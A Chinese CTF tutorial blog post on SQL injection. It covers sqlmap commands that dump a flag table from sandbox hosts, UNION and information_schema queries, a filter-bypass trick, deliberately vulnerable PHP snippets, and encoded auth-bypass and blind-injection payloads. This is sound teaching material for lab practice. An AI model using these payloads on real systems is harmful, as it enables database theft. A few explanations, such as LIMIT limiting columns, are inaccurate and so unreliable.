---
title: SQL注入
date: 2025-11-15 20:53:26
tags:
index_img: https://gitee.com/bobrocket/img/raw/master/img/69189f3e3203f7be000915ab.png
categories: CTF
---

## 一、SQL 注入基础


**核心原理**：用户输入未经过滤直接拼接到 SQL 语句中，导致恶意代码被执行。  

**CTF 常见注入类型**：

- **联合查询注入（UNION）**
- **布尔盲注**
- **时间盲注**
- **报错注入**
- **堆叠查询注入**
- **宽字节注入**
- **二次注入**

**常见注入点**

- **GET 参数**：`http://example.com/page.php?id=1`
- **POST 参数**：登录框、搜索框、留言板等表单提交的参数。
- **Cookie**：`Cookie: user=admin; session=abc123`
- **HTTP 头部**：`User-Agent`, `Referer`, `X-Forwarded-For` 等。



## 二、SQLmap 自动注入快速上手



####  关键参数说明

|参数|作用|
|---|---|
|`-u`|指定目标 URL|
|`-r`|加载 HTTP 请求文件（Burp 抓包保存为 `.txt`）|
|`-p`|指定测试的参数（如 `id`、`username`）|
|`--dbs`|列出所有数据库|
|`-D <db>`|指定数据库|
|`--tables`|列出指定数据库的所有表|
|`-T <table>`|指定表|
|`--columns`|列出指定表的所有字段|
|`-C <columns>`|指定字段（多个用逗号分隔）|
|`--dump`|导出指定字段的数据|
|`--current-db`|获取当前数据库名|
|`--current-user`|获取当前数据库用户|
|`--technique`|指定注入技术（如 `B` 布尔盲注，`T` 时间盲注，`U` 联合查询）|
|`--time-sec`|时间盲注时的延迟时间（默认 5 秒）|
|`--tamper`|使用脚本绕过 WAF（如 `space2comment` 替换空格为注释）|
|`--threads`|多线程（默认 1，CTF 中建议 1-5 避免触发防护）|

```shell
python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 --current-db

python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables

python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --columns

python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag -C flag --dump
```

依次为查询最近使用的数据库，查询表，查询字段，转存数据



### 常见场景

#### 场景 1：GET 参数注入



**示例 URL**：`http://ctf.example.com/web1/?id=1`  

**操作流程**：

1. **检测注入点**：

    ```Bash
    python sqlmap.py -u "http://ctf.example.com/web1/?id=1"
    ```

2. **获取数据库**：

    ```Bash
    python sqlmap.py -u "http://ctf.example.com/web1/?id=1" --dbs
    ```

3. **获取表和字段**：

    ```Bash
    python sqlmap.py -u "http://ctf.example.com/web1/?id=1" -D ctf_db --tables
    python sqlmap.py -u "http://ctf.example.com/web1/?id=1" -D ctf_db -T flag --columns
    ```

4. **导出数据**：

    ```Bash
    python sqlmap.py -u "http://ctf.example.com/web1/?id=1" -D ctf_db -T flag -C flag --dump
    ```



#### 场景 2：POST 表单注入



**示例**：登录表单（`username` 和 `password` 参数）  

**操作流程**：

1. **Burp 抓包并保存为** **`request.txt`**：

    ```HTTP
    POST /login.php HTTP/1.1
    Host: ctf.example.com
    Content-Length: 31
    
    username=admin&password=123456
    ```

2. **SQLmap 检测**：

    ```Bash
    python sqlmap.py -r request.txt -p username  # 指定测试 username 参数
    ```

3. **后续操作同 GET 注入**：

    ```Bash
    python sqlmap.py -r request.txt -p username --dbs
    # ... 导出 flag
    ```



#### 场景 3：布尔盲注（无回显）



**特征**：页面无报错，仅根据输入返回“正常”或“异常”（如登录成功/失败）  

**操作流程**：

```Bash
# 指定布尔盲注技术
python sqlmap.py -r request.txt -p username --technique B --dbs
# 导出数据（较慢，耐心等待）
python sqlmap.py -r request.txt -p username -D ctf_db -T flag -C flag --dump
```



#### 场景 4：时间盲注（无回显）



**特征**：页面无任何差异，需通过响应时间判断  

**操作流程**：

```Bash
# 指定时间盲注技术，设置延迟 3 秒
python sqlmap.py -r request.txt -p username --technique T --time-sec 3 --dbs
# 导出数据（非常慢，可适当调大 threads）
python sqlmap.py -r request.txt -p username -D ctf_db -T flag -C flag --dump --threads 3
```



#### 场景 5：宽字节注入（GBK 编码）



**特征**：后端使用 `addslashes()` 或 `mysql_real_escape_string()` 过滤，但数据库为 GBK 编码  

**操作流程**：

```Bash
# 使用 tamper 脚本绕过
python sqlmap.py -u "http://ctf.example.com/web5/?id=1" --tamper=gbkencode --dbs
```



#### 场景 6：二次注入



**特征**：注入点不在初始输入，而在后续读取存储数据时触发（如注册用户名后登录）  

**操作流程**：

1. **注册恶意用户名**：`admin' --`  

2. **Burp 抓包登录请求并保存为 ** **`login.txt`**  

3. **SQLmap 检测登录请求中的 ** **`username`** ** 参数**：

    ```Bash
    python sqlmap.py -r login.txt -p username --dbs
    ```



### 参考文献

[sqlmap常用命令整理](https://blog.csdn.net/qq_44005305/article/details/146025669)

## 三、SQL语法

`show tables`查询所有表，可以看到flag表

`show columns from flag`查询flag表的所有字段

| 列名    |                                                              |
| :------ | ------------------------------------------------------------ |
| Field   | 列的名称。这是表中定义的列标识符。例如，如果表中有一个存储用户名的列，这里会显示相应的列名，如 `username` |
| Type    | 列的数据类型。表明该列可以存储的数据类型，如 `INT`（整数类型）、`VARCHAR(255)`（可变长度字符串，最大长度为 255）、`DATE`（日期类型）等 |
| Null    | 表示该列是否允许存储 `NULL` 值。如果显示 `YES`，则该列可以接受 `NULL`；如果显示 `NO`，则不允 |
| Key     | 显示该列是否被定义为键（如主键 `PRI`、唯一键 `UNI` 等）。如果是主键列，这里会显示 `PRI` |
| Default | 列的默认值。如果在创建表时为该列设置了默认值，这里会显示出来。例如，若某列默认值为 `0`，则会在此处显示 `0`。如果没有设置默认值，可能显示为 `NULL` 或空白 |
| Extra   | 提供关于该列的额外信息。例如，对于自增长列，这里可能显示 `auto_increment` |

union可以将两个select语句的结果合并到一个结果集中，但要求两个select语句有相同的列数

拼接后的语句：`select username from users where id=0 union select password from users`

`order by` 关键字用于对结果集按照一个列或者多个列进行排序，我们可以利用二分法联合查询字段数

SELECT 语句用于从数据库中选取数据

`SELECT column1, column2, ... FROM table_name;` 

WHERE 子句用于提取那些满足指定条件的记录

`SELECT column1, column2, ... FROM table_name WHERE condition;` 

LIMIT 子句用于控制查询的列

`SELECT column1, column2, ... FROM table_name LIMIT 3;`  返回前 3 行数据

`select database()`可以用来获取当前数据库的名字

使用`union select`语句，结合`information_schema`系统表，获取表名和列名

`select  group_concat(table_name) from information_schema.tables where table_schema=database()`

查询字段 `select group_concat(column_name) from information_schema.columns where table_name='flag'`

查询值 `select 1,group_concat(flag) from sqli.flag`

#### 过滤

[Sql注入绕过速查表 - 白阁文库](https://baizesec.github.io/bylibrary/速查表/sql注入绕过速查表/)

#### 双写绕过

SQL 注入中双写绕过的目标是对抗**WAF / 过滤规则对关键词（如`select`）的删除 / 替换**：过滤规则通常会匹配并删除字符串中的`select`，因此构造逻辑是：

把`select`拆分为「前缀 + 后缀」（且`前缀+后缀=select`），再在中间插入完整的`select`，形成「前缀 + select + 后缀」。当 WAF 删除中间的`select`后，剩余的「前缀 + 后缀」会重新拼接成完整的`select`

> 双写绕过的经典逻辑是「等长拆分关键词」（如`union`拆`uni+union+on`、`insert`拆`ins+insert+ert`），`select`拆 3+3 是行业通用写法，而`se+select+lect`是错误的拆分思路，既不通用，也易因过滤规则的微小差异失效。



## 四、简单的SQL注入

### 数字型注入

#### 1. 核心特征

- 注入参数直接拼接在SQL语句中，**未被引号包裹**。

- 示例测试：输入 `id=2-1` 仍能查出数据（本质执行 `id=1` 的查询逻辑）。

#### 2. 关键语法与用法

- **union 联合查询**：可将两个 `select` 语句的结果合并，要求两语句**列数相同**。

- 拼接后示例语句：

    ```SQL
    select username from users where id=0 union select password from users
    ```

- **limit 关键字**：用于控制查询结果的返回条数（限制列数/行数）。

### 字符型注入

#### 1. 核心特征

- 注入参数被引号（单引号/双引号）包裹，需先**逃逸引号**才能注入。

- 示例PHP代码（存在注入漏洞）：

    ```PHP
    $conn=mysqli_connect('127.0.0.1','root','root','test');
    $res=mysqli_query($conn,"select id from users where username='".$_GET['username']."'");
    $row=mysqli_fetch_array($res);
    var_dump($row['id']);
    ```

#### 2. 注入思路与步骤

1. **闭合引号**：输入单引号 `'` 打破原SQL语句的引号平衡。

2. **构造条件**：使用 `or` 拼接恒真条件（如 `1=1`），使查询返回所有结果。

3. **注释后续**：用 `#` 注释掉原语句中多余的引号和代码（避免语法错误）。

#### 3. 示例操作

- 注入输入（需URL编码）：`username='or1=1#`

    - URL编码后：`username=%27or%201=1%23`

- 实际执行的SQL语句：

    ```SQL
    select id from users where username=''or 1=1 #
    ```

- 逻辑说明：`or` 连接两个表达式，第一个表达式（`''` 匹配）为假，第二个（`1=1`）为真，最终返回所有用户的id（示例中仅1条数据，返回id=1）。

### 布尔盲注

#### 1. 核心特征

- 不直接返回查询结果，仅通过页面反馈（如“user exist”/“user not exist”）判断查询是否成功。

- 示例PHP代码（布尔盲注场景）：

    ```PHP
    $conn=mysqli_connect('127.0.0.1','root','root','test');
    $res=mysqli_query($conn,"select id from users where username='".$_GET['username']."'");
    $count=mysqli_num_rows($res);
    if($count>0){
        echo "user exist";
    }else{
        echo "user not exist";
    }
    ```

#### 2. 注入思路：逐字符猜解

- 利用字符串截取函数（如 `substr`），逐位验证目标字段（如密码）的字符。

#### 3. 关键函数：substr

- 语法：`substr(字符串, 起始位置, 截取长度)`

- 示例：`substr(password,1,1)` 表示截取 `password` 字段的第1个字符（起始位置从1开始）。

#### 4. 示例操作

- 猜解密码第1个字符：注入输入（URL编码）：`username=%27or%20substr(password,1,1)=%271%27%23`

- 实际执行的SQL语句：

    ```SQL
    select id from users where username=''or substr(password,1,1)='1'#
    ```

- 逻辑说明：若密码第1个字符是 `1`，页面返回“user exist”；否则返回“user not exist”（示例中密码第1个字符为 `3`，故返回“user not exist”）。
